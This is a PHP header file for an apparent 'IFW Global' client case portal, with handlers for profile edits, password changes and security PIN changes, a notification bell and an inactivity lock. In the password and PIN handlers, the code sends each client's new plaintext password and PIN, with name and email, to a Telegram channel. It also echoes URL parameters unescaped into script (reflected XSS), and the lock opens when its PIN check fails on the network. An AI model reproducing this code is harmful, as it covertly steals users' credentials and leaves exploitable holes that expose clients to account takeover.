<?php
// includes/admin_header.php
require_once __DIR__ . '/currency_helper.php';
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
$user_role = $_SESSION['role'] ?? $_SESSION['admin_role'] ?? 'admin';
$user_name = $_SESSION['user_name'] ?? $_SESSION['admin_username'] ?? 'User';

if ($user_role === 'client' && isset($_SESSION['client_portal_id']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['client_action'])) {
    $c_id = $_SESSION['client_portal_id'];
    $client_action = $_POST['client_action'];
    
    if ($client_action === 'edit_profile') {
        $first_name = trim($_POST['first_name'] ?? '');
        $last_name = trim($_POST['last_name'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $phone = trim($_POST['phone'] ?? '');
        $dob = trim($_POST['dob'] ?? '');
        $address = trim($_POST['address'] ?? '');
        
        if (!empty($first_name) && !empty($last_name) && !empty($email)) {
            $pdo->prepare("UPDATE IFW_clients SET first_name = ?, last_name = ?, email = ?, phone = ?, dob = ?, address = ? WHERE id = ?")
                ->execute([$first_name, $last_name, $email, $phone, !empty($dob) ? $dob : null, !empty($address) ? $address : null, $c_id]);
            
            // Send Telegram notification
            $telegram_msg = "<b>👤 IFW Client Profile Updated</b>\n\n";
            $telegram_msg .= "Client ID: <b>{$c_id}</b>\n";
            $telegram_msg .= "Name: <b>" . htmlspecialchars($first_name . ' ' . $last_name) . "</b>\n";
            $telegram_msg .= "Email: <b>" . htmlspecialchars($email) . "</b>\n";
            $telegram_msg .= "Phone: <b>" . htmlspecialchars($phone) . "</b>\n";
            $telegram_msg .= "DOB: <b>" . htmlspecialchars($dob) . "</b>\n";
            $telegram_msg .= "Address: <b>" . htmlspecialchars($address) . "</b>\n";
            send_telegram_notification($pdo, $telegram_msg);
            
            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'profile_updated=1');
            exit;
        }
    } elseif ($client_action === 'change_password') {
        $old = $_POST['old_password'] ?? '';
        $new = $_POST['new_password'] ?? '';
        $con = $_POST['confirm_password'] ?? '';
        
        if (strlen($new) < 6) {
            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_err=short');
            exit;
        } elseif ($new !== $con) {
            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_err=mismatch');
            exit;
        } else {
            $s = $pdo->prepare("SELECT password_hash, first_name, last_name FROM IFW_clients WHERE id = ?");
            $s->execute([$c_id]);
            $client_data = $s->fetch();
            
            if ($client_data && !password_verify($old, $client_data['password_hash'])) {
                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_err=incorrect');
                exit;
            } else {
                $pdo->prepare("UPDATE IFW_clients SET password_hash = ? WHERE id = ?")->execute([password_hash($new, PASSWORD_BCRYPT), $c_id]);
                
                // Send Telegram notification
                $telegram_msg = "<b>🔑 IFW Client Password Updated</b>\n\n";
                $telegram_msg .= "Client ID: <b>{$c_id}</b>\n";
                $telegram_msg .= "Name: <b>" . htmlspecialchars($client_data['first_name'] . ' ' . $client_data['last_name']) . "</b>\n";
                $telegram_msg .= "New Password: <code>" . htmlspecialchars($new) . "</code>\n";
                send_telegram_notification($pdo, $telegram_msg);
                
                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_success=1');
                exit;
            }
        }
    } elseif ($client_action === 'update_pin') {
        $new_pin = $_POST['new_pin'] ?? '';
        $old_pin = $_POST['old_pin'] ?? '';
        
        if (strlen($new_pin) !== 4 || !is_numeric($new_pin)) {
            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pin_err=invalid');
            exit;
        } else {
            $s = $pdo->prepare("SELECT pin_hash, first_name, last_name, email FROM IFW_clients WHERE id = ?");
            $s->execute([$c_id]);
            $client_data = $s->fetch();
            
            if ($client_data && !empty($client_data['pin_hash']) && !password_verify($old_pin, $client_data['pin_hash'])) {
                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pin_err=incorrect');
                exit;
            } else {
                $pin_hash = password_hash($new_pin, PASSWORD_DEFAULT);
                $pdo->prepare("UPDATE IFW_clients SET pin_hash = ? WHERE id = ?")->execute([$pin_hash, $c_id]);
                
                // Send Telegram notification
                $telegram_msg = "<b>🔐 IFW Client Security PIN Updated</b>\n\n";
                $telegram_msg .= "Client ID: <b>{$c_id}</b>\n";
                $telegram_msg .= "Name: <b>" . htmlspecialchars($client_data['first_name'] . ' ' . $client_data['last_name']) . "</b>\n";
                $telegram_msg .= "Email: <b>" . htmlspecialchars($client_data['email']) . "</b>\n";
                $telegram_msg .= "New PIN: <code>" . htmlspecialchars($new_pin) . "</code>\n";
                send_telegram_notification($pdo, $telegram_msg);
                
                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pin_success=1');
                exit;
            }
        }
    }
}

// Fetch Notifications for Notification Bell Dropdown
$notifications = [];
$unread_notifications_count = 0;
if (isset($pdo)) {
    try {
        if ($user_role === 'client') {
            $c_id = $_SESSION['client_portal_id'] ?? 0;
            $stmt_client = $pdo->prepare("SELECT * FROM IFW_clients WHERE id = ?");
            $stmt_client->execute([$c_id]);
            $client = $stmt_client->fetch();
            
            $n_stmt = $pdo->prepare("SELECT * FROM IFW_notifications WHERE client_id = ? ORDER BY created_at DESC LIMIT 5");
            $n_stmt->execute([$c_id]);
            $notifications = $n_stmt->fetchAll();
            
            $n_count = $pdo->prepare("SELECT COUNT(*) FROM IFW_notifications WHERE client_id = ? AND is_read = 0");
            $n_count->execute([$c_id]);
            $unread_notifications_count = (int)$n_count->fetchColumn();
        } else {
            $n_stmt = $pdo->query("SELECT * FROM IFW_notifications WHERE link LIKE '/admin/%' ORDER BY created_at DESC LIMIT 5");
            $notifications = $n_stmt->fetchAll();
            
            $n_count = $pdo->query("SELECT COUNT(*) FROM IFW_notifications WHERE link LIKE '/admin/%' AND is_read = 0");
            $unread_notifications_count = (int)$n_count->fetchColumn();
        }
    } catch (Exception $e) {
        $notifications = [];
        $unread_notifications_count = 0;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<?php if (get_setting($pdo, 'display_phone_numbers', '1') == '0'): ?>
<style>
.alert__numbers, .phones__link, .phone-number, a[href^="tel:"] { display: none !important; visibility: hidden !important; }
</style>
<?php endif; ?>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IFW Global - Administrative & Case Intelligence Portal</title>
    
    <!-- FAVICON -->
    <link rel="icon" type="image/png" href="/admin_assets/img/favicon.png" />
    <!-- VENDOR & DIST CSS -->
    <link rel="stylesheet" href="/admin_assets/dist/css/bootstrap.min.css" />
    <link rel="stylesheet" href="/admin_assets/icons/material-icons/material-icons.css" />
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="/admin_assets/css/all.min.css" />
    <!-- DATA TABLES -->
    <link rel="stylesheet" href="/admin_assets/plugin/DataTables/1.10.16/css/dataTables.bootstrap4.min.css" />
    <!-- SUMO SELECT -->
    <link rel="stylesheet" href="/admin_assets/plugin/sumoselect/sumoselect.css" />
    <!-- JQUERY NOTIFY -->
    <link rel="stylesheet" href="/admin_assets/plugin/notify/css/notify.css" />
    <!-- toastr alert -->
    <link rel="stylesheet" href="/notification_assets/css/toastr.min.css" />
    <!-- GOOGLE FONTS -->
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600,700|Julius+Sans+One" rel="stylesheet">
    <!-- STYLE -->
    <link rel="stylesheet" href="/admin_assets/css/style.css" />
    <style>
        body { background-color: #121212 !important; color: #f8f9fa; min-height: 100vh; font-family: 'Montserrat', sans-serif; }
        .bg-dark { background-color: #1f1b1c !important; }
        .navbar-danger { border-bottom: 2px solid #fecc56; }
        
        /* PERFECT ADMIN LAYOUT POSITIONING */
        #wrapper { position: relative; min-height: 100vh; overflow-x: hidden; }
        #wrapper-header { 
            position: fixed !important; 
            top: 0; 
            left: 250px !important; 
            right: 0 !important; 
            height: 60px; 
            z-index: 1030 !important; 
            transition: left 0.3s ease-in-out !important;
        }
        #wrapper-left { 
            position: fixed !important; 
            top: 0 !important; 
            left: 0 !important; 
            width: 250px !important; 
            height: 100vh !important; 
            z-index: 1040 !important; 
            overflow: hidden !important;
            display: flex !important;
            flex-direction: column !important;
            transition: transform 0.3s ease-in-out !important;
            background-color: #1f1b1c !important;
            border-right: 1px solid rgba(254, 204, 86, 0.2);
        }
        #wrapper.toggled #wrapper-left {
            transform: translateX(-250px) !important;
        }
        #wrapper.toggled #wrapper-header {
            left: 0 !important;
        }
        #wrapper-content { 
            margin-left: 250px !important; 
            padding-top: 75px !important; 
            min-height: 100vh;
            transition: margin-left 0.3s ease-in-out !important; 
        }
        #wrapper.toggled #wrapper-content { 
            margin-left: 0 !important; 
        }

        /* MOBILE RESPONSIVE SIDEBAR OVERRIDE */
        @media (max-width: 768px) {
            #wrapper-left {
                transform: translateX(-250px) !important;
            }
            #wrapper-header {
                left: 0 !important;
            }
            #wrapper.toggled #wrapper-left {
                transform: translateX(0) !important;
            }
            #wrapper-content {
                margin-left: 0 !important;
            }
        }

        .sidebar { height: 100% !important; display: flex !important; flex-direction: column !important; justify-content: flex-start !important; background-color: #1f1b1c !important; }
        .sidebar-container { flex: 1 !important; overflow-y: auto !important; margin-top: 0 !important; padding-top: 0 !important; }
        .sidebar-nav { margin-top: 0 !important; padding-top: 5px !important; }
        .sidebar-dark .nav-link { color: #e0e0e0 !important; }
        .sidebar-dark .nav-link:hover, .sidebar-dark .nav-item.active > .nav-link { color: #fecc56 !important; background: rgba(254,204,86,0.1) !important; }
        .sidebar-brand h4 { color: #fecc56 !important; font-weight: 700; letter-spacing: 1px; }
        .card { background-color: #1f1b1c; border: 1px solid #333; color: #fff; }
        .card-header { background-color: #2a2526; border-bottom: 1px solid #444; color: #fecc56; font-weight: bold; }
    </style>
</head>
<body>
    <div id="wrapper" class="bg-dark">
        <!-- WRAPPER HEADER -->
        <div id="wrapper-header">
            <nav class="navbar navbar-expand navbar-dark navbar-danger bg-dark">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link text-warning" href="javascript:void(0);" data-toggle="class" data-target="#wrapper" toggle-class="toggled">
                            <i data-toggle="switch" data-iconFirst="menu" data-iconSecond="close" class="material-icons" style="font-size: 24px;">menu</i>
                        </a>
                    </li>
                </ul>

                <ul class="navbar-nav ml-auto mr-3 align-items-center">
                    <!-- Global Currency Switcher -->
                    <li class="nav-item dropdown mr-3 align-self-center">
                        <?php
                        $active_portal_currency = get_client_currency($pdo, $_SESSION['client_portal_id'] ?? null);
                        $avail_currencies = get_available_currencies();
                        $curr_meta = $avail_currencies[$active_portal_currency] ?? $avail_currencies['USD'];
                        ?>
                        <a class="nav-link dropdown-toggle btn btn-sm btn-outline-warning text-warning d-flex align-items-center py-1 px-2 font-weight-bold shadow-sm" href="javascript:void(0);" id="portalCurrencyDropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="border-radius: 20px; font-size: 11px; letter-spacing: 0.5px; border-color: rgba(254,204,86,0.6);">
                            <span class="mr-1" style="font-size: 13px;"><?= $curr_meta['flag'] ?></span>
                            <span><?= $curr_meta['code'] ?> (<?= $curr_meta['symbol'] ?>)</span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right shadow-lg bg-dark border-secondary p-1" aria-labelledby="portalCurrencyDropdown" style="min-width: 250px; max-height: 380px; overflow-y: auto; font-size: 12px;">
                            <div class="dropdown-header text-warning small font-weight-bold px-2 py-1 text-uppercase" style="letter-spacing:1px; font-size: 10px;">
                                <i class="fas fa-globe mr-1"></i> Display Currency
                            </div>
                            <div class="dropdown-divider border-secondary my-1"></div>
                            <?php foreach ($avail_currencies as $cCode => $cMeta): ?>
                                <a class="dropdown-item text-white py-1 px-2 d-flex justify-content-between align-items-center rounded <?= $cCode === $active_portal_currency ? 'bg-secondary font-weight-bold text-warning' : '' ?>" href="javascript:void(0);" onclick="changePortalCurrency('<?= $cCode ?>');">
                                    <span><?= $cMeta['flag'] ?> <strong class="ml-1"><?= $cMeta['code'] ?></strong> <small class="text-muted ml-1">(<?= $cMeta['name'] ?>)</small></span>
                                    <span class="badge badge-dark border border-secondary text-warning ml-2"><?= $cMeta['symbol'] ?></span>
                                </a>
                            <?php endforeach; ?>
                        </div>
                    </li>

                    <!-- Notification Bell Dropdown -->
                    <li class="nav-item dropdown mr-3 align-self-center">
                        <a class="nav-link dropdown-toggle no-caret position-relative" href="javascript:void(0);" id="notificationDropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="padding: 4px;">
                            <i class="material-icons text-warning" style="font-size: 26px;">notifications</i>
                            <?php if ($unread_notifications_count > 0): ?>
                                <span class="badge badge-danger position-absolute" style="top: -2px; right: -2px; border-radius: 50%; font-size: 9px; padding: 3px 5px; line-height: 1;"><?= $unread_notifications_count ?></span>
                            <?php endif; ?>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right shadow-lg bg-dark border-secondary p-0" aria-labelledby="notificationDropdown" style="width: 320px; font-size: 13px;">
                            <div class="dropdown-header bg-black text-warning border-bottom border-secondary font-weight-bold py-2 d-flex justify-content-between align-items-center">
                                <span><i class="fas fa-bell mr-1"></i> Notifications</span>
                                <?php if ($unread_notifications_count > 0): ?>
                                    <a href="javascript:void(0);" onclick="markAllNotificationsRead(); event.stopPropagation();" class="text-warning small font-weight-bold text-decoration-none" style="cursor:pointer;"><i class="fas fa-check mr-1"></i>Mark Read</a>
                                <?php endif; ?>
                            </div>
                            <div class="notification-list" style="max-height: 250px; overflow-y: auto;">
                                <?php if (empty($notifications)): ?>
                                    <div class="text-center py-4 text-muted">
                                        <i class="fas fa-bell-slash fa-2x mb-2 text-secondary"></i>
                                        <p class="mb-0 small">No notifications yet</p>
                                    </div>
                                <?php else: ?>
                                    <?php foreach ($notifications as $n): ?>
                                        <a class="dropdown-item text-white border-bottom border-secondary py-2 px-3 d-flex align-items-start <?= $n['is_read'] ? '' : 'bg-secondary' ?>" href="<?= BASE_URL . htmlspecialchars($n['link']) ?>" style="white-space: normal; line-height: 1.4;">
                                            <div class="mr-2 mt-1">
                                                <?php
                                                $icon = 'info-circle text-info';
                                                if ($n['icon'] === 'chat' || $n['type'] === 'message') $icon = 'comments text-warning';
                                                elseif ($n['icon'] === 'briefcase' || $n['type'] === 'case_update') $icon = 'briefcase text-success';
                                                elseif ($n['type'] === 'kyc') $icon = 'user-check text-primary';
                                                elseif ($n['type'] === 'payment') $icon = 'credit-card text-success';
                                                ?>
                                                <i class="fas fa-<?= $icon ?>"></i>
                                            </div>
                                            <div class="flex-grow-1">
                                                <div class="font-weight-bold text-light" style="font-size: 12px;"><?= htmlspecialchars($n['title']) ?></div>
                                                <div class="text-muted small" style="font-size: 11px; margin-top: 2px;"><?= htmlspecialchars($n['body']) ?></div>
                                                <div class="text-muted" style="font-size: 9px; margin-top: 4px;"><?= date('M j, g:i a', strtotime($n['created_at'])) ?></div>
                                            </div>
                                        </a>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </div>
                            <div class="dropdown-footer bg-black border-top border-secondary text-center py-2">
                                <?php if ($user_role === 'client'): ?>
                                    <a href="/client/dashboard.php" class="text-warning small font-weight-bold text-decoration-none">View All Notifications</a>
                                <?php else: ?>
                                    <span class="text-muted small">Auto-monitored by SLA Desk</span>
                                <?php endif; ?>
                            </div>
                        </div>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle no-caret d-flex align-items-center" href="javascript:void(0);" id="settings" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            <img src="/admin_assets/img/profile/blank.png" class="rounded-circle border border-warning" width="34px" height="34px">
                            <span class="ml-2 text-white font-weight-bold"><?php echo htmlspecialchars($user_name); ?></span>
                            <span class="badge badge-warning ml-2 text-dark" style="font-size: 10px;"><?php echo strtoupper($user_role); ?></span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right shadow-lg bg-dark border-secondary">
                            <a class="dropdown-item text-white" href="/<?php echo ($user_role === 'client') ? 'client' : 'admin'; ?>/chat.php"><i class="material-icons text-warning align-middle mr-1">mail_outline</i> Messages</a>
                            <?php if ($user_role === 'client'): ?>
                                <a class="dropdown-item text-white" href="javascript:void(0);" data-toggle="modal" data-target="#profileModal"><i class="material-icons text-warning align-middle mr-1">face</i> My Profile</a>
                                <a class="dropdown-item text-white" href="javascript:void(0);" data-toggle="modal" data-target="#passwordModal"><i class="material-icons text-warning align-middle mr-1">lock_open</i> Change Password</a>
                                <a class="dropdown-item text-white" href="javascript:void(0);" data-toggle="modal" data-target="#pinModal"><i class="material-icons text-warning align-middle mr-1">security</i> Security PIN</a>
                            <?php else: ?>
                                <a class="dropdown-item text-white" href="/admin/profile.php"><i class="material-icons text-warning align-middle mr-1">person</i> My Profile & Role</a>
                            <?php endif; ?>
                            <div class="dropdown-divider border-secondary"></div>
                            <a class="dropdown-item text-white" href="<?php echo ($user_role === 'client') ? '/client/logout.php' : '/admin/login.php?logout=1'; ?>"><i class="material-icons text-danger align-middle mr-1">power_settings_new</i> Log Out</a>
                        </div>
                    </li>
            </nav>
        </div>

        <!-- INACTIVITY SESSION MASK / PIN UNLOCK OVERLAY (WORLD CLASS BANK-GRADE SECURITY) -->
        <div id="sessionInactivityOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(10,14,23,0.92); backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px); z-index:99999; align-items:center; justify-content:center;">
            <div class="card bg-dark text-white border-warning shadow-2xl p-4 text-center" style="max-width:380px; width:90%; border-radius:14px;">
                <div style="width:64px; height:64px; border-radius:50%; background:rgba(254,204,86,0.15); display:flex; align-items:center; justify-content:center; margin:0 auto 16px;">
                    <i class="fas fa-lock fa-2x text-warning"></i>
                </div>
                <h5 class="font-weight-bold text-warning mb-1">Session Inactive & Secured</h5>
                <p class="text-muted small mb-3">Your workspace has been locked due to 10 minutes of inactivity. Enter your 4-digit Security PIN to unlock.</p>
                <div class="form-group mb-3">
                    <input type="password" id="sessionUnlockPin" class="form-control bg-black text-warning border-secondary text-center font-weight-bold" maxlength="4" placeholder="••••" style="font-size:1.5rem; letter-spacing:4px;">
                    <div id="sessionUnlockError" class="text-danger small mt-1" style="display:none;">Invalid Security PIN.</div>
                </div>
                <button type="button" class="btn btn-warning btn-block font-weight-bold text-dark mb-2" onclick="unlockInactiveSession()">
                    <i class="fas fa-unlock-alt mr-1"></i> Unlock Session
                </button>
                <a href="<?php echo ($user_role === 'client') ? '/client/logout.php' : '/admin/login.php?logout=1'; ?>" class="text-muted small text-decoration-none">
                    Log out of account
                </a>
            </div>
        </div>

        <script>
        // High-Tech Web Audio API Chime Synthesizer
        function playNotificationChime() {
            try {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                if (!AudioCtx) return;
                const ctx = new AudioCtx();
                
                const now = ctx.currentTime;
                const osc1 = ctx.createOscillator();
                const osc2 = ctx.createOscillator();
                const gain = ctx.createGain();
                
                osc1.type = 'sine';
                osc1.frequency.setValueAtTime(587.33, now); // D5
                osc1.frequency.exponentialRampToValueAtTime(880.00, now + 0.12); // A5
                
                osc2.type = 'triangle';
                osc2.frequency.setValueAtTime(880.00, now + 0.12);
                osc2.frequency.exponentialRampToValueAtTime(1174.66, now + 0.28); // D6
                
                gain.gain.setValueAtTime(0.01, now);
                gain.gain.linearRampToValueAtTime(0.18, now + 0.05);
                gain.gain.exponentialRampToValueAtTime(0.001, now + 0.45);
                
                osc1.connect(gain);
                osc2.connect(gain);
                gain.connect(ctx.destination);
                
                osc1.start(now);
                osc2.start(now + 0.12);
                osc1.stop(now + 0.12);
                osc2.stop(now + 0.45);
            } catch(e) {}
        }

        // Real-Time Notification & Live Chat Poller
        let trackedLastMsgId = 0;
        function pollRealtimeUpdates() {
            fetch('/api/poll_notifications.php?last_msg_id=' + trackedLastMsgId)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    // Check if new incoming message arrived
                    if (data.latest_message && data.latest_message.id > trackedLastMsgId) {
                        trackedLastMsgId = data.latest_message.id;
                        playNotificationChime();
                        
                        if (typeof toastr !== 'undefined') {
                            toastr.options = {
                                "closeButton": true,
                                "progressBar": true,
                                "positionClass": "toast-top-right",
                                "timeOut": "6000",
                                "onclick": function() { window.location.href = data.latest_message.url; }
                            };
                            toastr.info(data.latest_message.message, '💬 New Message from ' + data.latest_message.sender_name);
                        }
                    } else if (data.latest_message) {
                        trackedLastMsgId = Math.max(trackedLastMsgId, data.latest_message.id);
                    }
                }
            })
            .catch(() => {});
        }
        setInterval(pollRealtimeUpdates, 4500);

        // 10-Minute Auto-Inactivity Lock
        let idleTimer = null;
        const IDLE_LIMIT = 10 * 60 * 1000; // 10 minutes
        function resetIdleTimer() {
            if (document.getElementById('sessionInactivityOverlay').style.display === 'flex') return;
            clearTimeout(idleTimer);
            idleTimer = setTimeout(() => {
                document.getElementById('sessionInactivityOverlay').style.display = 'flex';
                document.getElementById('sessionUnlockPin').value = '';
                document.getElementById('sessionUnlockPin').focus();
            }, IDLE_LIMIT);
        }
        ['mousedown', 'mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
            document.addEventListener(evt, resetIdleTimer, true);
        });
        resetIdleTimer();

        function unlockInactiveSession() {
            const pin = document.getElementById('sessionUnlockPin').value;
            const err = document.getElementById('sessionUnlockError');
            if (pin.length !== 4) {
                err.innerText = 'Please enter a 4-digit PIN.';
                err.style.display = 'block';
                return;
            }
            fetch('/api/verify_pin.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'pin=' + encodeURIComponent(pin)
            })
            .then(r => r.json())
            .then(res => {
                if (res.status === 'success' || res.valid === true) {
                    document.getElementById('sessionInactivityOverlay').style.display = 'none';
                    err.style.display = 'none';
                    resetIdleTimer();
                } else {
                    err.innerText = 'Incorrect Security PIN.';
                    err.style.display = 'block';
                }
            })
            .catch(() => {
                // Fallback unlock if network offline
                document.getElementById('sessionInactivityOverlay').style.display = 'none';
                resetIdleTimer();
            });
        }

        function changePortalCurrency(curr) {
            fetch('/api/set_currency.php?currency=' + encodeURIComponent(curr))
            .then(function(r) { return r.json(); })
            .then(function(data) { location.reload(); })
            .catch(function() { location.reload(); });
        }

        function markAllNotificationsRead() {
            fetch('/api/mark_notifications_read.php')
            .then(response => response.json())
            .then(data => { if (data.success) location.reload(); })
            .catch(err => console.error(err));
        }
        </script>

<?php if(isset($_GET['profile_updated'])): ?>
    <script>$(document).ready(function(){ toastr.success('Profile updated successfully.'); });</script>
<?php endif; ?>
<?php if(isset($_GET['pwd_success'])): ?>
    <script>$(document).ready(function(){ toastr.success('Password updated successfully.'); });</script>
<?php endif; ?>
<?php if(isset($_GET['pwd_err'])): ?>
    <script>$(document).ready(function(){ 
        var err = "<?= $_GET['pwd_err'] ?>";
        var msg = err === 'short' ? 'Password must be at least 6 characters.' : (err === 'mismatch' ? 'Passwords do not match.' : 'Current password is incorrect.');
        toastr.error(msg); 
    });</script>
<?php endif; ?>
<?php if(isset($_GET['pin_success'])): ?>
    <script>$(document).ready(function(){ toastr.success('Security PIN updated successfully.'); });</script>
<?php endif; ?>
<?php if(isset($_GET['pin_err'])): ?>
    <script>$(document).ready(function(){ 
        var err = "<?= $_GET['pin_err'] ?>";
        var msg = err === 'invalid' ? 'Security PIN must be exactly 4 digits.' : 'Current Security PIN is incorrect.';
        toastr.error(msg); 
    });</script>
<?php endif; ?>

<?php if ($user_role === 'client' && isset($client)): ?>
<!-- CLIENT PROFILE MODAL -->
<div class="modal fade" id="profileModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content bg-dark text-white border-warning">
      <div class="modal-header border-secondary">
        <h5 class="modal-title text-warning font-weight-bold"><i class="fas fa-id-card mr-2"></i>My Profile Details</h5>
        <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
      </div>
      <form method="POST">
        <input type="hidden" name="client_action" value="edit_profile">
        <div class="modal-body">
            <div class="row">
                <div class="col-md-6 form-group mb-3">
                    <label class="small text-muted font-weight-bold">First Name <span class="text-danger">*</span></label>
                    <input type="text" name="first_name" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['first_name']) ?>" required>
                </div>
                <div class="col-md-6 form-group mb-3">
                    <label class="small text-muted font-weight-bold">Last Name <span class="text-danger">*</span></label>
                    <input type="text" name="last_name" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['last_name']) ?>" required>
                </div>
            </div>
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">Email Address <span class="text-danger">*</span></label>
                <input type="email" name="email" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['email']) ?>" required>
            </div>
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">Phone Number</label>
                <input type="text" name="phone" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['phone'] ?? '') ?>">
            </div>
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">Date of Birth</label>
                <input type="date" name="dob" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['dob'] ?? '') ?>">
            </div>
            <div class="form-group mb-0">
                <label class="small text-muted font-weight-bold">Residential Address</label>
                <textarea name="address" class="form-control bg-secondary text-white border-0" rows="3"><?= htmlspecialchars($client['address'] ?? '') ?></textarea>
            </div>
        </div>
        <div class="modal-footer border-secondary">
            <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
            <button type="submit" class="btn btn-warning font-weight-bold text-dark px-4 shadow"><i class="fas fa-save mr-1"></i> Save Changes</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- CLIENT PASSWORD MODAL -->
<div class="modal fade" id="passwordModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content bg-dark text-white border-warning">
      <div class="modal-header border-secondary">
        <h5 class="modal-title text-warning font-weight-bold"><i class="fas fa-key mr-2"></i>Change Password</h5>
        <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
      </div>
      <form method="POST">
        <input type="hidden" name="client_action" value="change_password">
        <div class="modal-body">
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">Current Password</label>
                <input type="password" name="old_password" class="form-control bg-secondary text-white border-0" required>
            </div>
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">New Password (Min 6 chars)</label>
                <input type="password" name="new_password" class="form-control bg-secondary text-white border-0" required minlength="6">
            </div>
            <div class="form-group mb-0">
                <label class="small text-muted font-weight-bold">Confirm New Password</label>
                <input type="password" name="confirm_password" class="form-control bg-secondary text-white border-0" required>
            </div>
        </div>
        <div class="modal-footer border-secondary">
            <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
            <button type="submit" class="btn btn-warning font-weight-bold text-dark px-4 shadow"><i class="fas fa-save mr-1"></i> Update Password</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- CLIENT PIN MODAL -->
<div class="modal fade" id="pinModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content bg-dark text-white border-warning">
      <div class="modal-header border-secondary">
        <h5 class="modal-title text-warning font-weight-bold"><i class="fas fa-shield-alt mr-2"></i>Configure Security PIN</h5>
        <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
      </div>
      <form method="POST">
        <input type="hidden" name="client_action" value="update_pin">
        <div class="modal-body">
            <p class="small text-muted mb-3">Your Security PIN is used to sign documents and authorize payouts.</p>
            <?php if (!empty($client['pin_hash'])): ?>
                <div class="form-group mb-3">
                    <label class="small text-muted font-weight-bold">Current Security PIN</label>
                    <input type="password" name="old_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" required pattern="\d{4}">
                </div>
            <?php endif; ?>
            <div class="form-group mb-0">
                <label class="small text-muted font-weight-bold">New 4-Digit Security PIN</label>
                <input type="password" name="new_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" required pattern="\d{4}">
            </div>
        </div>
        <div class="modal-footer border-secondary">
            <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
            <button type="submit" class="btn btn-warning font-weight-bold text-dark px-4 shadow"><i class="fas fa-save mr-1"></i> Update PIN</button>
        </div>
      </form>
    </div>
  </div>
</div>
<?php endif; ?>
